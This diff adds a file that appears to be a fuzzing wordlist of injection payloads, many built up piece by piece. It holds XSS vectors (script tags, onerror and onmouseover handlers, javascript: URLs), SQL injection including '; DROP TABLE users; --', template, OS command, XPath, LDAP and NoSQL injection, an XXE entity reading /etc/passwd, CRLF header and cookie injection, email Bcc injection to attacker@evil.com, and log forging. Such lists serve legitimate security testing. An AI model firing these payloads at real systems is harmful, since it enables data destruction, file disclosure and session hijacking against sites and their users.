@@ -1,0 +1,158 @@
+<img
+<img src=x
+<img src=x onerror=
+<img src=x onerror=alert(1)
+<img src=x onerror=alert(1)>
+"
+" onmouseover=
+" onmouseover="alert(1)
+" onmouseover="alert(1)"
+" onmouseover="alert(1)" x="
+onmouseover
+onmouseover=
+onmouseover="alert(1)
+onmouseover="alert(1)"
+-->
+--><script>
+--><script>alert(1)
+--><script>alert(1)</script>
+--><script>alert(1)</script><!--
+"
+";
+";alert(1)
+";alert(1);
+";alert(1);//
+"
+")
+");
+");alert(1)
+");alert(1);//
+"
+"}
+"};
+"};alert(1)
+"};alert(1);//
+\n
+\nalert(1)
+\nalert(1);//
+"
+",
+","newprop":
+","newprop":"value"
+","newprop":"value"}
+"test"
+"test":
+"test":"value"
+"test":"value","xss":"alert(1)"
+"
+"]
+"];
+"];alert(1)
+"];alert(1);//
+"
+"});
+"});alert(1)
+"});alert(1);//
+red;
+red;background:
+red;background:url(javascript:alert(1))
+red;background:url(javascript:alert(1));
+red;}
+red;}body{
+red;}body{background:url(javascript:alert(1))
+red;}body{background:url(javascript:alert(1))}
+"
+"]
+"] { background:url(javascript:alert(1))
+"] { background:url(javascript:alert(1)) }
+javascript:
+javascript:alert(1)
+javascript:alert(1);//
+"
+" onerror="
+" onerror="alert(1)
+" onerror="alert(1)"
+javascript:alert(1)
+" onsubmit="alert(1)
+" onsubmit="alert(1)"
+'
+';
+'; DROP TABLE users;
+'; DROP TABLE users; --
+123;
+123; DROP TABLE users;
+123; DROP TABLE users; --
+'
+' OR '1'='1
+' OR '1'='1' --
+}}
+}}{{
+}}{{7*7}}
+}}{{7*7}}{{
+}}
+}}<script>
+}}<script>alert(1)
+}}<script>alert(1)</script>{{
+}}
+}}" onmouseover="alert(1)
+}}" onmouseover="alert(1)" class="{{
+]]>
+]]><script>alert(1)</script><![CDATA[
+]]></data><script>alert(1)</script><data><![CDATA[
+"
+" newattr="
+" newattr="value
+" newattr="value"
+<script>
+<script>alert(1)
+<script>alert(1)</script>
+"
+";
+";alert(1);
+";alert(1);//
+}}
+}}{{constructor.constructor('alert(1)')()
+}}{{constructor.constructor('alert(1)')()}}{{
+}}
+}}<script>alert(1)</script>{{
+}}<img src=x onerror=alert(1)>{{
+"
+";
+"; ls
+"; ls #
+"; ls; echo "
+"&
+"& dir
+"& dir & echo "
+"& dir & REM
+'
+'] | 
+'] | //user/*
+' or '1'='1
+' or '1'='1' or '
+1]
+1] | //
+1 or position()=1
+*)
+*)(uid=*
+*)(uid=*)(|(uid=*
+admin)(|(objectClass=*
+<!DOCTYPE
+<!DOCTYPE foo [
+<!DOCTYPE foo [<!ENTITY
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;
+"
+", "password": {"$ne": "
+"}, {"$gt": "
+admin", "$or": [{"username": "admin
+test\r\n
+test\r\nX-Injected: true
+test\r\nSet-Cookie: admin=true
+test\r\n\r\n<html>
+user@example.com\n
+user@example.com\nCc: attacker@evil.com
+user@example.com\nBcc: attacker@evil.com\n
+testuser\n
+testuser\n[2024-01-01] User 'admin' logged in successfully
+testuser\r\n[INFO] Password reset for admin completed
